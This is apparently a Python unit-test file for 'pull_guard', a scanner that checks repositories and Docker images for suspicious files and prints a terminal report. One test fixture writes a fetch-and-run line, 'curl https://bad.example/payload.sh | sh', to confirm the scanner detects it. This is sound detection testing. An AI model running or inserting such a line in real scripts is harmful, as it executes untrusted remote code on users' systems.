import io
import tempfile
import tarfile
import unittest
import subprocess
from unittest import mock
from pathlib import Path

import pull_guard


class PullGuardTests(unittest.TestCase):
    def test_detects_suspicious_shell_dropper(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            repo = Path(tempdir)
            script = repo / "install.sh"
            script.write_text("curl https://bad.example/payload.sh | sh\n", encoding="utf-8")

            with mock.patch("pull_guard.run_clamscan", return_value=[]):
                findings = pull_guard.scan_repository(repo)

            self.assertTrue(any(item.rule == "curl-pipe-shell" for item in findings))

    def test_detects_repo_symlink_escape(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            repo = Path(tempdir)
            target = repo / "outside-link"
            target.symlink_to("/tmp/evil")

            with mock.patch("pull_guard.run_clamscan", return_value=[]):
                findings = pull_guard.scan_repository(repo)

            self.assertTrue(any(item.rule == "symlink-escape" for item in findings))

    def test_clean_file_has_no_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            repo = Path(tempdir)
            source = repo / "main.py"
            source.write_text("print('hello world')\n", encoding="utf-8")

            with mock.patch("pull_guard.run_clamscan", return_value=[]):
                findings = pull_guard.scan_repository(repo)

            self.assertEqual(findings, [])

    def test_image_busybox_style_symlink_is_not_flagged(self) -> None:
        member = tarfile.TarInfo("bin/sh")
        member.type = tarfile.SYMTYPE
        member.linkname = "/bin/busybox"

        findings = pull_guard.scan_tar_member(member, None)  # type: ignore[arg-type]

        self.assertEqual(findings, [])

    def test_terminal_report_shows_clean_status(self) -> None:
        report = pull_guard.format_terminal_report(
            [],
            mode_label="Repository Scan",
            target_label="/tmp/example",
            disable_color=True,
        )

        self.assertIn("Pull Guard Terminal Dashboard", report)
        self.assertIn("Status   :  CLEAN ", report)
        self.assertIn("No suspicious indicators were found.", report)
        self.assertIn("Top Risks", report)
        self.assertIn("Recommendations", report)

    def test_terminal_report_shows_findings(self) -> None:
        report = pull_guard.format_terminal_report(
            [
                pull_guard.Finding(
                    severity="high",
                    scope="repo",
                    target="payload.sh",
                    rule="curl-pipe-shell",
                    detail="Detected curl piped directly into a shell.",
                )
            ],
            mode_label="Repository Scan",
            target_label="/tmp/example",
            disable_color=True,
        )

        self.assertIn("Status   :  REVIEW REQUIRED ", report)
        self.assertIn("HIGH RISK", report)
        self.assertIn("Top Risks", report)
        self.assertIn("curl-pipe-shell", report)
        self.assertIn("payload.sh", report)

    def test_terminal_report_collapses_excess_findings(self) -> None:
        findings = [
            pull_guard.Finding(
                severity="medium",
                scope="repo",
                target=f"file-{index}.txt",
                rule="suspicious-extension",
                detail="detail",
            )
            for index in range(10)
        ]

        report = pull_guard.format_terminal_report(
            findings,
            mode_label="Repository Scan",
            target_label="/tmp/example",
            disable_color=True,
            max_details=3,
        )

        self.assertIn("Collapsed Summary", report)
        self.assertIn("Remaining 7 finding(s) are summarized here.", report)

    def test_terminal_report_can_show_git_pull_status(self) -> None:
        report = pull_guard.format_terminal_report(
            [],
            mode_label="Git Pull + Scan",
            target_label="/tmp/example",
            disable_color=True,
            extra_header_lines=["Git Pull  : FAILED (remote unavailable, scanned existing local checkout instead)"],
        )

        self.assertIn("Git Pull  : FAILED", report)

    def test_git_pull_scan_continues_when_pull_fails(self) -> None:
        fake_pull_failure = subprocess.CompletedProcess(
            args=["git", "-C", "/tmp/example", "pull"],
            returncode=1,
            stdout="",
            stderr="Couldn't connect to server",
        )
        findings = [
            pull_guard.Finding(
                severity="medium",
                scope="repo",
                target="payload.com",
                rule="suspicious-extension",
                detail="File extension .com deserves extra review.",
            )
        ]

        with mock.patch("pull_guard.run_command", return_value=fake_pull_failure), mock.patch(
            "pull_guard.scan_repository",
            return_value=findings,
        ), mock.patch("sys.stdout", new_callable=io.StringIO) as stdout, mock.patch(
            "sys.stderr",
            new_callable=io.StringIO,
        ) as stderr, mock.patch("builtins.print") as fake_print:
            args = mock.Mock(
                repo=".",
                remote=None,
                branch=None,
                scan_only=False,
                strict_pull=False,
                json=False,
                plain=False,
                no_progress=True,
                no_color=True,
                max_findings=8,
            )
            exit_code = pull_guard.handle_git_pull(args)

        self.assertEqual(exit_code, 1)
        self.assertIn("Couldn't connect to server", stderr.getvalue())
        rendered = "\n".join(call.args[0] for call in fake_print.call_args_list if call.args)
        self.assertIn("Git Pull  : FAILED", rendered)

    def test_docker_pull_scan_continues_when_pull_fails_but_local_image_exists(self) -> None:
        fake_pull_failure = subprocess.CompletedProcess(
            args=["docker", "pull", "example:latest"],
            returncode=1,
            stdout="",
            stderr="pull access denied",
        )
        findings = [
            pull_guard.Finding(
                severity="medium",
                scope="image",
                target="example:latest",
                rule="suspicious-extension",
                detail="Image contains a file with extension .com.",
            )
        ]

        with mock.patch("pull_guard.run_command", return_value=fake_pull_failure), mock.patch(
            "pull_guard.image_exists_locally",
            return_value=True,
        ), mock.patch("pull_guard.scan_docker_image", return_value=findings), mock.patch(
            "sys.stdout",
            new_callable=io.StringIO,
        ) as stdout, mock.patch("sys.stderr", new_callable=io.StringIO) as stderr, mock.patch(
            "builtins.print"
        ) as fake_print:
            args = mock.Mock(
                image="example:latest",
                scan_only=False,
                strict_pull=False,
                json=False,
                plain=False,
                no_progress=True,
                no_color=True,
                max_findings=8,
            )
            exit_code = pull_guard.handle_docker_pull(args)

        self.assertEqual(exit_code, 1)
        self.assertIn("pull access denied", stderr.getvalue())
        rendered = "\n".join(call.args[0] for call in fake_print.call_args_list if call.args)
        self.assertIn("Docker Pull: FAILED", rendered)


if __name__ == "__main__":
    unittest.main()
